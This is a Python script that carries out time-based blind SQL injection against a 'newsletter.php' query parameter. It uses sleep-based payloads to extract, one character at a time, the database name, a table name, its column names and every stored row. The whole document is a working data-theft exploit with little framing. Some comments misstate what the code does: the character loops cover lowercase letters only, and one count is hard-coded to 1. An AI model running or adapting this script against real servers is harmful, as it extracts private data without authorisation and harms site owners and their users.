# SQL Time-Based Blind Injection
# Python script to hit a vulnerable query parameter that allows a pause
# to be included if the SQL query is successful.

import requests
import sys
import time

# Send payload to the vulnerable parameter on the target host
# If it takes 5 seconds or longer to get a reply -> true response
# http://<ip>/newsletter.php?PARAM1=VAL1&PARAM2=VAL2'[INSERT_SQL_SCRIPT_HERE]
def send_payload(ip, payload):
    start = time.time()
    r = requests.get(f"http://{ip}/newsletter.php?PARAM1=test&PARAM2=test' OR IF({payload}, sleep(5), 'NO') AND '1'='1")
    end = time.time()
    if end-start >= 5:
        return True
    else:
        return False

# Brute-force the length of the database name
# Iterate to all possible letters and brute-force the name of the database
def brute_db(ip):
    length = 0
    for i in range(0,100):
        payload = f"LENGTH(DATABASE())='{i}'"
        if send_payload(ip, payload):
            length = i
            break
    print(f'database name length = {length}')
    sys.stdout.write("dumping: ")
    sys.stdout.flush()

    db_name = ""
    for i in range(1, length+1):
        for j in range (96,123): # a-z, A-Z, 0-9 (adjust as needed for the character set)
            # Check if char(j) is a valid letter in position i in the database name
            payload = f"SUBSTRING(DATABASE(),{i},1)='{chr(j)}'"
            if send_payload(ip, payload):
                db_name += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.flush()
    return db_name

# Brute-force the number of tables in the database
# Iterate to all possible letters and brute-force the name of the first table
def brute_table(ip):
    num_tables = 0
    for i in range(0,100):
        payload = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE())='{i}'"
        if send_payload(ip, payload):
            num_tables = 1
            break
    print(f'number of tables = {num_tables}')

    length = 0
    for i in range(0,100):
        payload = f"LENGTH((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1))='{i}'"
        if send_payload(ip, payload):
            length = i
            break
    print(f'table name length = {length}')

    table_name = ""
    for i in range(1, length + 1):
        for j in range(96, 123): # a-z, A-Z, 0-9 (adjust as needed for the character set)
            payload = f"SUBSTRING((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),{i},1)='{chr(j)}'"
            if send_payload(ip, payload):
                table_name += chr(j)
                break  # Exit the inner loop when the character is found
    return table_name

# Brute-force the number of columns in the database
# Iterate to all possible letters and brute-force the name of all the columns
# Return all the names space separated
def brute_columns(ip, table_name):
    num_columns = 0
    for i in range(0,100):
        payload = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}')='{i}'"
        if send_payload(ip, payload):
            num_columns = i
            break
    print(f'number of columns= {num_columns}')
    
    column_names = []
    for col_index in range(0, num_columns):
        # Determine the length of each column name
        length = 0
        for i in range(1, 51):  # Adjust 51 as needed for longer column names
            payload = f"LENGTH((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {col_index},1))='{i}'"
            if send_payload(ip, payload):
                length = i
                break
        print(f'column #{col_index} length = {length}')
    
        # Extract each character of the column name
        column_name = ""
        for j in range(1, length + 1):
            for char_code in range(32, 127):  # ASCII range for printable characters
                payload = f"SUBSTRING((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {col_index},1),{j},1)='{chr(char_code)}'"
                if send_payload(ip, payload):
                    column_name += chr(char_code)
                    break
        column_names.append(column_name)
    
    # Join all column names with a space separator
    result = " ".join(column_names)
    return result

# Dump the contents from the given column in the given table
def brute_rows(ip, table_name, column_name):
    num_rows = 0
    for i in range(0,100):
        payload = f"(SELECT COUNT(*) FROM {table_name})='{i}'"
        if send_payload(ip, payload):
            num_rows = i
            break
    print(f'number of rows = {num_rows}')

    secret_data = []
    for row_index in range(0, num_rows):
        # Determine the length of the value for the current row
        length = 0
        for i in range(1, 51):  # Adjust 51 as needed for longer entries
            payload = f"LENGTH((SELECT {column_name} FROM {table_name} LIMIT {row_index},1))='{i}'"
            if send_payload(ip, payload):
                length = i
                break
        
        # Extract each character of the value
        secret_value = ""
        for j in range(1, length + 1):
            for char_code in range(32, 127):  # ASCII range for printable characters
                payload = f"SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {row_index},1),{j},1)='{chr(char_code)}'"
                if send_payload(ip, payload):
                    secret_value += chr(char_code)
                    break
        secret_data.append(secret_value)
    
    return secret_data


def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <ip>')
        sys.exit(1)
    ip = sys.argv[1]
    print(f'database name = {brute_db(ip)}')
    table_name = brute_table(ip)
    print(f'table name = {table_name}')
    column_names = brute_columns(ip, table_name)
    print(f'column names = {column_names}')
    for column_name in column_names.split():
        print(f'secret value = {brute_rows(ip, table_name, column_name)}')


if __name__ == "__main__":
    main()

